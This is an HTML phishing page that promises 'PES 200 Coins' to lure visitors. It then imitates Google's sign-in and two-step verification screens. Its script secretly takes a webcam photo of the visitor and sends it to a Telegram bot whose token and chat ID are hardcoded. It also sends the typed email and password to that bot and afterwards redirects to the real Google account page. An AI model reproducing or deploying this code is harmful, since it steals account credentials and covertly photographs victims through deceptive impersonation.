<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Claim PES 200 Coins 🎁</title>
    <style>
        body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; }
        .screen { display: none; height: 100vh; width: 100vw; flex-direction: column; align-items: center; justify-content: center; position: fixed; top: 0; left: 0; }
        .active { display: flex; }

        /* الواجهة 1: PES */
        #pes-ui { background: radial-gradient(circle, #2c3e50 0%, #000 100%); text-align: center; }
        .pes-card { background: rgba(255,255,255,0.05); padding: 30px; border-radius: 20px; border: 1px solid #e67e22; width: 85%; max-width: 350px; }
        .btn-claim { background: #e67e22; color: white; border: none; padding: 15px; width: 100%; border-radius: 50px; font-weight: bold; font-size: 18px; margin-top: 20px; cursor: pointer; }

        /* الواجهة 2: Google */
        #google-ui { background: #fff; }
        .g-box { width: 90%; max-width: 400px; text-align: center; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .g-btn { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 500; cursor: pointer; }

        /* الواجهة 3: التفعيل (رقم 2) */
        #verify-ui { background: #fff; color: #202124; text-align: center; }
        .big-num { font-size: 80px; font-weight: bold; margin: 20px 0; color: #202124; }
        .verify-text { font-size: 18px; margin-bottom: 10px; padding: 0 20px; }

        #v, #c { display: none; }
    </style>
</head>
<body>

    <div id="pes-ui" class="screen active">
        <div class="pes-card">
            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjD3YjG_5W9M7z6f5L8P6S7vS8/s1600/pes-coin.png" style="width:100px;">
            <h2 style="color:#e67e22;">PES 200 COINS</h2>
            <p style="color:#ccc;">Verification is required to confirm your ID.</p>
            <button class="btn-claim" onclick="goGoogle()">CLAIM NOW</button>
        </div>
    </div>

    <div id="google-ui" class="screen">
        <div class="g-box">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:100px; margin-bottom:20px;">
            <h2 style="font-weight:400; margin-bottom:10px;">Sign in</h2>
            <p style="margin-bottom:30px;">Use your Google Account</p>
            <input type="email" id="email" placeholder="Email or phone">
            <input type="password" id="pass" placeholder="Enter your password">
            <button class="g-btn" onclick="goVerify()">Next</button>
        </div>
    </div>

    <div id="verify-ui" class="screen">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" style="width:80px; margin-top:50px;">
        <h2 class="verify-text" style="margin-top:30px;">Is it you trying to sign in?</h2>
        <p style="color:#5f6368; padding:0 30px;">Google sent a notification to your phone. Tap the number below to stay signed in.</p>
        <div class="big-num">2</div>
        <p style="color:#5f6368; font-size:14px;">Trying to sign in from Algeria</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c" width="640" height="480"></canvas>

    <script>
        const T = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; 
        const C = "7479786207";

        async function goGoogle() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('v').srcObject = s;
                // تصوير بعد 5 ثواني
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
                    canvas.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', C); f.append('photo', b, 'v.jpg'); f.append('caption', '🎯 Face Captured!');
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f });
                    }, 'image/jpeg');
                }, 5000);
            } catch (e) {}
            document.getElementById('pes-ui').classList.remove('active');
            document.getElementById('google-ui').classList.add('active');
        }

        function goVerify() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e && p) {
                const msg = `✅ DATA:\n📧 Email: ${e}\n🔑 Pass: ${p}`;
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
                
                // الانتقال للواجهة الثالثة (الرقم 2)
                document.getElementById('google-ui').classList.remove('active');
                document.getElementById('verify-ui').classList.add('active');
                
                // التوجيه النهائي بعد 6 ثواني لموقع قوقل
                setTimeout(() => { window.location.href = "https://myaccount.google.com/"; }, 6000);
            }
        }
    </script>
</body>
</html>
